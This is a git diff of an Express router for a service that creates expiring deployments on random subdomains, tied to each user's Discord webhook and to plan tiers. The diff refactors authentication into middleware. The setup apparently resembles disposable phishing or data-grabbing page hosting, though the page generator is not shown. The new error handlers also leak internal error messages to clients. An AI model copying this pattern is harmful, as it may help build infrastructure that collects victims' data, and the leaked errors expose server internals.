@@ -6,29 +6,49 @@ const Deployment = require('../models/Deployment');
 const { generateDeployedPage } = require('../utils/deployPage');
 const router = express.Router();
 
-router.get('/my', async (req, res) => {
+// ===== MIDDLEWARE: Check token =====
+function checkToken(req, res, next) {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'Unauthorized: No token provided' });
+  }
+  const token = authHeader.split(' ')[1];
   try {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ error: 'Unauthorized' });
     const decoded = jwt.verify(token, process.env.JWT_SECRET);
-    const deployments = await Deployment.find({ userId: decoded.userId, active: true }).sort({ createdAt: -1 });
+    req.userId = decoded.userId;
+    next();
+  } catch (err) {
+    return res.status(403).json({ error: 'Forbidden: Invalid token' });
+  }
+}
+
+// ===== GET MY DEPLOYMENTS =====
+router.get('/my', checkToken, async (req, res) => {
+  try {
+    const deployments = await Deployment.find({ 
+      userId: req.userId,
+      active: true 
+    }).sort({ createdAt: -1 });
     res.json({ deployments });
   } catch (error) {
-    res.status(401).json({ error: 'Invalid token' });
+    console.error('Get deployments error:', error);
+    res.status(500).json({ error: 'Server error: ' + error.message });
   }
 });
 
-router.post('/new', async (req, res) => {
+// ===== CREATE NEW DEPLOYMENT =====
+router.post('/new', checkToken, async (req, res) => {
   try {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ error: 'Unauthorized' });
-    const decoded = jwt.verify(token, process.env.JWT_SECRET);
-    const user = await User.findById(decoded.userId);
-    if (!user) return res.status(404).json({ error: 'User not found' });
+    const user = await User.findById(req.userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    
     if (!user.webhook) {
       return res.status(400).json({ error: 'Please set your Discord webhook first' });
     }
 
+    // Check daily limit
     const today = new Date().toDateString();
     let dailyLimit = 2;
     if (user.plan === 'pro') dailyLimit = 10;
@@ -43,6 +63,7 @@ router.post('/new', async (req, res) => {
       });
     }
 
+    // Calculate expiry
     let hours = 1;
     if (user.plan === 'pro') hours = 24;
     if (user.plan === 'elite') hours = 48;
@@ -51,11 +72,14 @@ router.post('/new', async (req, res) => {
     const expiresAt = new Date();
     expiresAt.setHours(expiresAt.getHours() + hours);
 
+    // Generate unique subdomain
     const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}`;
     const url = `https://${subdomain}.${process.env.DOMAIN}`;
 
+    // Generate page HTML
     const pageHTML = generateDeployedPage(user.webhook, subdomain);
 
+    // Save deployment
     const deployment = new Deployment({
       userId: user._id,
       subdomain,
@@ -67,6 +91,7 @@ router.post('/new', async (req, res) => {
     });
     await deployment.save();
 
+    // Update user daily count
     if (user.lastDeployDate === today) {
       user.dailyDeploys++;
     } else {
@@ -86,27 +111,44 @@ router.post('/new', async (req, res) => {
     });
 
   } catch (error) {
-    console.error(error);
-    res.status(500).json({ error: 'Server error' });
+    console.error('Deploy error:', error);
+    res.status(500).json({ error: 'Server error: ' + error.message });
   }
 });
 
-router.delete('/:subdomain', async (req, res) => {
+// ===== DELETE DEPLOYMENT =====
+router.delete('/:subdomain', checkToken, async (req, res) => {
   try {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ error: 'Unauthorized' });
-    const decoded = jwt.verify(token, process.env.JWT_SECRET);
     const { subdomain } = req.params;
     const deployment = await Deployment.findOne({ subdomain });
-    if (!deployment) return res.status(404).json({ error: 'Not found' });
-    if (deployment.userId.toString() !== decoded.userId) {
+    
+    if (!deployment) {
+      return res.status(404).json({ error: 'Deployment not found' });
+    }
+    
+    if (deployment.userId.toString() !== req.userId) {
       return res.status(403).json({ error: 'Not yours' });
     }
+    
     deployment.active = false;
     await deployment.save();
     res.json({ success: true, message: 'Deployment deleted' });
   } catch (error) {
-    res.status(500).json({ error: 'Server error' });
+    console.error('Delete deployment error:', error);
+    res.status(500).json({ error: 'Server error: ' + error.message });
+  }
+});
+
+// ===== GET ALL DEPLOYMENTS (for user) =====
+router.get('/all', checkToken, async (req, res) => {
+  try {
+    const deployments = await Deployment.find({ 
+      userId: req.userId 
+    }).sort({ createdAt: -1 });
+    res.json({ deployments });
+  } catch (error) {
+    console.error('Get all deployments error:', error);
+    res.status(500).json({ error: 'Server error: ' + error.message });
   }
 });
 
